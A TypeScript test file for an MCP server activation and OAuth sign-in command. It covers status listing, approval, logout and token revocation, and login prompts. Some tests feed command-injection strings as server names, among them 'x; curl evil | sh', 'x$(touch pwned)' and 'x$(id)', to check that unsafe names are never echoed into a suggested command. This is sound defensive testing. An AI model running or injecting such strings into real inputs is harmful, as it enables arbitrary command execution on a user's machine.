import { describe, expect, it } from 'vitest';

import { createTestCommandHost } from '@robota-sdk/agent-framework/testing';

import { FunctionTool } from '@robota-sdk/agent-core';

import { executeMCPActivationCommand } from '../mcp-activation-command.js';
import { createMCPActivationCommandEntry } from '../mcp-activation-command-module.js';

import type {
  ICommandMCPActivationAdapter,
  ICommandMCPActivationSummary,
  ICommandMCPOAuthLoginRequest,
  ICommandMCPOAuthLoginResult,
} from '@robota-sdk/agent-framework';
import type {
  IActionRequest,
  IToolWithEventService,
  TActionResponse,
} from '@robota-sdk/agent-core';

function summary(
  overrides: Partial<ICommandMCPActivationSummary> = {},
): ICommandMCPActivationSummary {
  return {
    serverId: 'server-1',
    displayName: 'Example server',
    source: 'project',
    status: 'pending',
    allowed: false,
    reason: 'Approval required.',
    provenanceId: 'project-settings',
    definitionFingerprint: 'definition-v1',
    securityIdentity: 'identity-v1',
    ...overrides,
  };
}

function context(adapter?: ICommandMCPActivationAdapter) {
  return createTestCommandHost({
    overrides: { getCommandHostAdapters: () => (adapter ? { mcpActivation: adapter } : {}) },
  });
}

describe('executeMCPActivationCommand', () => {
  it('lists status without invoking an activation operation', async () => {
    let operations = 0;
    const entry = summary();
    const adapter: ICommandMCPActivationAdapter = {
      list: () => [entry],
      approve: async () => {
        operations++;
        return entry;
      },
      reject: async () => entry,
      revoke: async () => entry,
    };

    const result = await executeMCPActivationCommand(context(adapter), 'status');

    expect(result.success).toBe(true);
    expect(result.message).toContain('pending');
    expect(result.message).toContain('server-1');
    expect(operations).toBe(0);
  });

  it('routes approve/reject/revoke to the host adapter and preserves the exact id', async () => {
    const calls: string[] = [];
    const adapter: ICommandMCPActivationAdapter = {
      list: () => [],
      approve: (id) => {
        calls.push(`approve:${id}`);
        return summary({ status: 'approved', allowed: true, reason: 'Approved.' });
      },
      reject: (id) => {
        calls.push(`reject:${id}`);
        return summary({ status: 'rejected', reason: 'Rejected.' });
      },
      revoke: (id) => {
        calls.push(`revoke:${id}`);
        return summary({ status: 'revoked', reason: 'Revoked.' });
      },
    };

    expect((await executeMCPActivationCommand(context(adapter), 'approve Server-A')).success).toBe(
      true,
    );
    expect((await executeMCPActivationCommand(context(adapter), 'reject Server-A')).success).toBe(
      true,
    );
    expect((await executeMCPActivationCommand(context(adapter), 'revoke Server-A')).success).toBe(
      true,
    );
    expect(calls).toEqual(['approve:Server-A', 'reject:Server-A', 'revoke:Server-A']);
  });

  it('does not guess an id and never activates when the adapter is absent', async () => {
    expect((await executeMCPActivationCommand(context(), '')).success).toBe(true);
    expect((await executeMCPActivationCommand(context(), 'approve')).success).toBe(false);
    expect((await executeMCPActivationCommand(context(), 'approve server-1')).message).toMatch(
      /not available/i,
    );
  });

  // BEHAVIOR-2794 (issue #2794 / #3073): a source-level problem (an unreadable managed policy, a
  // config root that is not an object, no `mcpServers`) names no server, so it never appears in
  // `list()`. Before `sourceProblems()` existed on the adapter, `/mcp status` had no way to say an
  // entire source could not be read — it just said nothing beyond whatever DID resolve.
  it('states which source could not be read, beside the servers that did resolve', async () => {
    const entry = summary();
    const adapter: ICommandMCPActivationAdapter = {
      list: () => [entry],
      sourceProblems: () => [
        {
          source: 'managed',
          origin: 'policy.json',
          reason: 'the configuration root is not an object',
        },
      ],
      approve: async () => entry,
      reject: async () => entry,
      revoke: async () => entry,
    };

    const result = await executeMCPActivationCommand(context(adapter), 'status');

    expect(result.success).toBe(true);
    // The resolved server is still reported...
    expect(result.message).toContain('server-1');
    // ...beside the source that could not be read at all.
    expect(result.message).toContain('managed');
    expect(result.message).toContain('policy.json');
    expect(result.message).toContain('the configuration root is not an object');
    expect(result.data).toMatchObject({
      sourceProblems: [
        {
          source: 'managed',
          origin: 'policy.json',
          reason: 'the configuration root is not an object',
        },
      ],
    });
  });

  // PR #3076 re-review: a managed-tier source problem also blocks every lower-tier server that would
  // otherwise have resolved (`agent-mcp`'s `resolveByPrecedence`) — those names never appear in
  // `list()` (an `unresolved` entry is never an activation candidate), so this line is the ONLY place
  // `/mcp status` can say a lower-tier server exists at all and why it is not active.
  it('states that lower-tier servers are blocked, listing their names, for a managed source problem', async () => {
    const adapter: ICommandMCPActivationAdapter = {
      list: () => [],
      sourceProblems: () => [
        {
          source: 'managed',
          origin: 'policy.json',
          reason: 'the configuration root is not an object',
          blockedServerNames: ['weather', 'search'],
        },
      ],
      approve: async () => summary(),
      reject: async () => summary(),
      revoke: async () => summary(),
    };

    const result = await executeMCPActivationCommand(context(adapter), 'status');

    expect(result.success).toBe(true);
    expect(result.message).toContain('managed');
    expect(result.message).toContain('policy.json');
    expect(result.message).toMatch(/blocked/i);
    expect(result.message).toContain('weather');
    expect(result.message).toContain('search');
  });

  it('says nothing extra about blocking for a source problem with no blocked servers', async () => {
    const adapter: ICommandMCPActivationAdapter = {
      list: () => [],
      sourceProblems: () => [
        { source: 'user', origin: 'settings.json', reason: '`mcpServers` is not an object' },
      ],
      approve: async () => summary(),
      reject: async () => summary(),
      revoke: async () => summary(),
    };

    const result = await executeMCPActivationCommand(context(adapter), 'status');

    expect(result.success).toBe(true);
    expect(result.message).not.toMatch(/blocked/i);
  });

  it('reports a source problem even when nothing resolved at all', async () => {
    const adapter: ICommandMCPActivationAdapter = {
      list: () => [],
      sourceProblems: () => [
        { source: 'managed', origin: 'policy.json', reason: 'no `mcpServers` key' },
      ],
      approve: async () => summary(),
      reject: async () => summary(),
      revoke: async () => summary(),
    };

    const result = await executeMCPActivationCommand(context(adapter), 'status');

    expect(result.success).toBe(true);
    expect(result.message).not.toMatch(/no mcp definitions are registered/i);
    expect(result.message).toContain('managed');
    expect(result.message).toContain('policy.json');
  });

  it('treats a missing sourceProblems() the same as none, for an older adapter', async () => {
    const entry = summary();
    const adapter: ICommandMCPActivationAdapter = {
      list: () => [entry],
      approve: async () => entry,
      reject: async () => entry,
      revoke: async () => entry,
    };

    const result = await executeMCPActivationCommand(context(adapter), 'status');

    expect(result.success).toBe(true);
    expect(result.message).toContain('server-1');
  });
});

describe('/mcp and OAuth sign-in', () => {
  function oauthAdapter(): ICommandMCPActivationAdapter & { loggedOut: string[] } {
    const loggedOut: string[] = [];
    return {
      loggedOut,
      list: () => [
        summary({ serverId: 'files', status: 'approved', allowed: true }),
        summary({ serverId: 'plain', status: 'approved', allowed: true }),
      ],
      approve: async () => summary(),
      reject: async () => summary(),
      revoke: async () => summary(),
      oauthStatus: async () => [{ serverId: 'files', state: 'expired-refreshable' }],
      oauthLogout: async (serverId) => {
        loggedOut.push(serverId);
        return {
          serverId,
          removed: true,
          revocation: 'failed',
          revocationFailure: 'revocation-failed',
        };
      },
    };
  }

  it('shows each OAuth server sign-in state as a fixed word, and nothing for the rest', async () => {
    const result = await executeMCPActivationCommand(context(oauthAdapter()), 'status');
    const lines = result.message.split('\n');
    expect(lines.find((line) => line.includes('files'))).toMatch(
      /OAuth: token expired, will refresh$/,
    );
    expect(lines.find((line) => line.includes('plain'))).not.toContain('OAuth');
    const servers = (result.data as { servers: Record<string, unknown>[] }).servers;
    expect(servers[0]).toMatchObject({ serverId: 'files', oauth: 'expired-refreshable' });
    expect(servers[1]).not.toHaveProperty('oauth');
  });

  it('signs out through the port and reports revocation by reason only', async () => {
    const adapter = oauthAdapter();
    const result = await executeMCPActivationCommand(context(adapter), 'logout files');
    expect(adapter.loggedOut).toEqual(['files']);
    expect(result.success).toBe(true);
    expect(result.message).toBe(
      'Signed out of MCP server files; token revocation failed (revocation-failed); ' +
        'the tokens stay valid until they expire.',
    );
  });

  it('says which token was revoked when only one was', async () => {
    const adapter: ICommandMCPActivationAdapter = {
      ...oauthAdapter(),
      oauthLogout: async (serverId) => ({
        serverId,
        removed: true,
        revocation: 'partial',
        revocationFailure: 'token-type-not-revocable',
        tokens: [
          { token: 'refresh_token', revoked: true },
          { token: 'access_token', revoked: false, failure: 'token-type-not-revocable' },
        ],
      }),
    };
    const result = await executeMCPActivationCommand(context(adapter), 'logout files');
    expect(result.message).toBe(
      'Signed out of MCP server files; the refresh token was revoked; the access token was not ' +
        '(token-type-not-revocable) and stays valid until it expires.',
    );
  });

  it('refuses to sign out of a server that does not declare OAuth', async () => {
    const adapter = oauthAdapter();
    const result = await executeMCPActivationCommand(context(adapter), 'logout plain');
    expect(result.success).toBe(false);
    expect(adapter.loggedOut).toEqual([]);
  });

  function withServer(serverId: string): ICommandMCPActivationAdapter {
    return {
      ...oauthAdapter(),
      list: () => [summary({ serverId, status: 'approved', allowed: true })],
      oauthStatus: async () => [{ serverId, state: 'sign-in-required' }],
    };
  }

  it('points a server that needs a sign-in at the session command and the terminal one', async () => {
    const result = await executeMCPActivationCommand(context(withServer('files')), 'status');
    expect(result.message).toContain(
      'OAuth: sign-in required (run /mcp login files, or robota mcp login files in a terminal)',
    );
  });

  it.each([
    ['a command separator', 'x; curl evil | sh'],
    ['a command substitution', 'x$(touch pwned)'],
    ['backticks', 'x`touch pwned`'],
    ['a backslash-quote', "\\';touch pwned;#"],
    ['a leading dash', '-rf'],
    ['a leading equals sign', '=cmd'],
    ['a newline', 'x\nrobota mcp login good'],
    ['an escape sequence', 'x\u001b[2Kgood'],
    ['a right-to-left override', 'x‮good'],
  ])('never puts a name with %s into the sign-in command', async (_what, name) => {
    const result = await executeMCPActivationCommand(context(withServer(name)), 'status');
    const hint = /\(run \/mcp login [^)]*\)/.exec(result.message)?.[0];
    expect(hint).toBe(
      '(run /mcp login <server>, or robota mcp login <server> in a terminal; ' +
        'its name cannot be shown safely here)',
    );
  });

  it('a sign-out needs a server', async () => {
    const logout = await executeMCPActivationCommand(context(oauthAdapter()), 'logout');
    expect(logout.success).toBe(false);
    expect(logout.message).toBe('Usage: /mcp logout <serverId>');
  });
});

describe('/mcp login', () => {
  interface ILoginHarness {
    readonly requests: ICommandMCPOAuthLoginRequest[];
    readonly added: IToolWithEventService[][];
    readonly asked: IActionRequest[];
    readonly acknowledged: [string, readonly string[]][];
    run(args: string): ReturnType<typeof executeMCPActivationCommand>;
  }

  const forecast = new FunctionTool(
    { name: 'files__read', description: 'Read', parameters: { type: 'object', properties: {} } },
    async () => 'ok',
  );

  function harness(
    login: (request: ICommandMCPOAuthLoginRequest) => Promise<ICommandMCPOAuthLoginResult>,
    answer?: TActionResponse | ((request: IActionRequest) => TActionResponse),
    taken: (names: string[]) => string[] = (names) => names,
  ): ILoginHarness {
    const requests: ICommandMCPOAuthLoginRequest[] = [];
    const added: IToolWithEventService[][] = [];
    const asked: IActionRequest[] = [];
    const acknowledged: [string, readonly string[]][] = [];
    const port: ICommandMCPActivationAdapter = {
      list: () => [],
      approve: async () => summary(),
      reject: async () => summary(),
      revoke: async () => summary(),
      oauthLogin: (request) => {
        requests.push(request);
        return login(request);
      },
      oauthToolsAdded: (serverId, names) => acknowledged.push([serverId, names]),
    };
    const host = createTestCommandHost({
      overrides: {
        getCommandHostAdapters: () => ({ mcpActivation: port }),
        getUserInteraction: () =>
          answer === undefined
            ? undefined
            : {
                ask: async (request) => {
                  asked.push(request);
                  return typeof answer === 'function' ? answer(request) : answer;
                },
              },
      },
    });
    const session = host.getSession();
    host.getSession = () => ({
      ...session,
      addTools: async (tools) => {
        added.push([...tools]);
        return taken(tools.map((tool) => tool.schema.name));
      },
    });
    return {
      requests,
      added,
      asked,
      acknowledged,
      run: (args) => executeMCPActivationCommand(host, args),
    };
  }

  const signedIn = (
    serverId: string,
    extra: Partial<ICommandMCPOAuthLoginResult> = {},
  ): ICommandMCPOAuthLoginResult => ({
    serverId,
    preRegisteredClient: false,
    connection: 'connected',
    tools: [forecast],
    ...extra,
  });

  it('signs in and adds the connected server tools to this session', async () => {
    const h = harness(async (request) => signedIn(request.serverId));
    const result = await h.run('login files');
    expect(result.success).toBe(true);
    expect(result.message).toBe(
      'Signed in to MCP server files; 1 of its tools is available from your next message.',
    );
    expect(h.requests[0]).toMatchObject({ serverId: 'files', noBrowser: false });
    expect(h.added).toEqual([[forecast]]);
    expect(result.data).toEqual({
      serverId: 'files',
      connection: 'connected',
      tools: ['files__read'],
    });
  });

  it('asks for the pasted redirect through the session prompt, masked', async () => {
    const h = harness(
      async (request) => {
        const pasted = await request.readRedirect?.(
          {
            authorizationUrl: 'https://auth.example.test/authorize?x=1',
            redirectUri: 'http://127.0.0.1:1234/callback',
          },
          new AbortController().signal,
        );
        expect(pasted).toBe('http://127.0.0.1:1234/callback?code=c&state=s');
        return signedIn(request.serverId);
      },
      { type: 'answer', values: [], text: 'http://127.0.0.1:1234/callback?code=c&state=s' },
    );
    const result = await h.run('login files --no-browser');
    expect(result.success).toBe(true);
    expect(h.requests[0]?.noBrowser).toBe(true);
    expect(h.asked).toHaveLength(1);
    expect(h.asked[0]).toMatchObject({ masked: true, allowFreeText: true });
    expect(h.asked[0]?.description).toContain('https://auth.example.test/authorize?x=1');
    // The pasted redirect carries a code; it is never part of the result.
    expect(JSON.stringify(result)).not.toContain('code=c');
  });

  it('treats a dismissed paste as a cancelled sign-in', async () => {
    const h = harness(
      async (request) => {
        await expect(
          request.readRedirect?.(
            { authorizationUrl: 'https://a.test/', redirectUri: 'http://127.0.0.1:1/callback' },
            new AbortController().signal,
          ),
        ).rejects.toThrow();
        return {
          serverId: request.serverId,
          failure: 'cancelled',
          preRegisteredClient: false,
          tools: [],
        };
      },
      { type: 'cancelled' },
    );
    const result = await h.run('login files --no-browser');
    expect(result.success).toBe(false);
    expect(result.message).toBe(
      'Sign-in to MCP server files failed (cancelled); nothing was changed.',
    );
    expect(h.added).toEqual([]);
  });

  it('never asks for a client secret, and names the terminal command instead', async () => {
    const h = harness(async (request) => signedIn(request.serverId));
    const result = await h.run('login files --client-secret');
    expect(result.success).toBe(false);
    expect(result.message).toContain('robota mcp login files --client-secret in a terminal');
    expect(h.requests).toEqual([]);
  });

  it('suggests the secret sign-in only for a pre-registered client whose exchange failed', async () => {
    const failing = (preRegisteredClient: boolean) =>
      harness(async (request) => ({
        serverId: request.serverId,
        failure: 'token-exchange-failed',
        preRegisteredClient,
        tools: [],
      })).run('login files');
    expect((await failing(true)).message).toContain(
      'run robota mcp login files --client-secret in a terminal',
    );
    expect((await failing(false)).message).not.toContain('--client-secret');
  });

  it('shows a server name in a suggested command only when it is safe to paste', async () => {
    const h = harness(async (request) => ({
      serverId: request.serverId,
      failure: 'browser-failed',
      preRegisteredClient: false,
      tools: [],
    }));
    expect((await h.run('login files')).message).toContain('/mcp login files --no-browser');
    expect((await h.run('login x$(id)')).message).toContain('/mcp login <server> --no-browser');
    expect((await h.run('login =cmd --client-secret')).message).toContain(
      'robota mcp login <server> --client-secret',
    );
  });

  it('says how the server stands when it did not connect', async () => {
    const run = (connection: ICommandMCPOAuthLoginResult['connection']) =>
      harness(async (request) => signedIn(request.serverId, { connection, tools: [] })).run(
        'login files',
      );
    expect((await run('recovered')).message).toBe(
      'Signed in to MCP server files; its tools work again.',
    );
    expect((await run('not-admitted')).message).toContain('not approved for this session');
    expect((await run('not-connected')).message).toContain('could not connect in this session');
  });

  const PROMPT = {
    authorizationUrl: 'https://auth.example.test/authorize?x=1',
    redirectUri: 'http://127.0.0.1:1234/callback',
  };

  it('shows the authorization URL before the browser opens, and lets the user cancel', async () => {
    const choices: string[] = [];
    let signal: AbortSignal | undefined;
    const h = harness(
      async (request) => {
        signal = request.signal;
        const choice = await request.confirmBrowser!(PROMPT, new AbortController().signal);
        choices.push(choice);
        return {
          serverId: request.serverId,
          failure: 'cancelled',
          preRegisteredClient: false,
          tools: [],
        };
      },
      (request) => ({ type: 'answer', values: [request.options?.at(-1)?.value ?? ''] }),
    );
    const result = await h.run('login files');
    expect(h.asked[0]?.description).toContain(PROMPT.authorizationUrl);
    expect(h.asked[0]?.options?.map((option) => option.value)).toEqual(['open', 'paste', 'cancel']);
    expect(choices).toEqual(['cancel']);
    // The cancel reaches the sign-in itself.
    expect(signal?.aborted).toBe(true);
    expect(result.success).toBe(false);
    expect(h.added).toEqual([]);
  });

  it('opens the browser, or pastes instead, as the user chooses', async () => {
    const chosen = async (value: string) => {
      let choice: string | undefined;
      const h = harness(
        async (request) => {
          choice = await request.confirmBrowser!(PROMPT, new AbortController().signal);
          return signedIn(request.serverId);
        },
        { type: 'answer', values: [value] },
      );
      await h.run('login files');
      return choice;
    };
    expect(await chosen('open')).toBe('open');
    expect(await chosen('paste')).toBe('paste');
    // With --no-browser there is nothing to confirm: the paste prompt shows the URL.
    const h = harness(async (request) => signedIn(request.serverId), {
      type: 'answer',
      values: ['open'],
    });
    await h.run('login files --no-browser');
    expect(h.requests[0]?.confirmBrowser).toBeUndefined();
  });

  it('reports tools left out for a name the session already has, and acknowledges the rest', async () => {
    const other = new FunctionTool(
      { name: 'files__list', description: 'List', parameters: { type: 'object', properties: {} } },
      async () => 'ok',
    );
    const h = harness(
      async (request) => signedIn(request.serverId, { tools: [forecast, other] }),
      undefined,
      (names) => names.filter((name) => name !== 'files__read'),
    );
    const result = await h.run('login files');
    expect(result.message).toBe(
      'Signed in to MCP server files; 1 of its tools is available from your next message. ' +
        '1 of its tools was left out: the session already has a tool by that name.',
    );
    expect(h.acknowledged).toEqual([['files', ['files__list']]]);
  });

  it('needs exactly one server', async () => {
    const h = harness(async (request) => signedIn(request.serverId));
    expect((await h.run('login')).message).toBe('Usage: /mcp login <serverId> [--no-browser]');
    expect((await h.run('login a b')).success).toBe(false);
    expect(h.requests).toEqual([]);
  });
});

describe('/mcp command entry', () => {
  it('is user-only, and describes login for the model reading the catalog', () => {
    const entry = createMCPActivationCommandEntry();
    expect(entry.modelInvocable).toBe(false);
    expect(entry.description).toMatch(/sign in/);
    expect(entry.description).toMatch(/Returns/);
    expect(entry.argumentHint).toContain('login <server> [--no-browser]');
  });
});
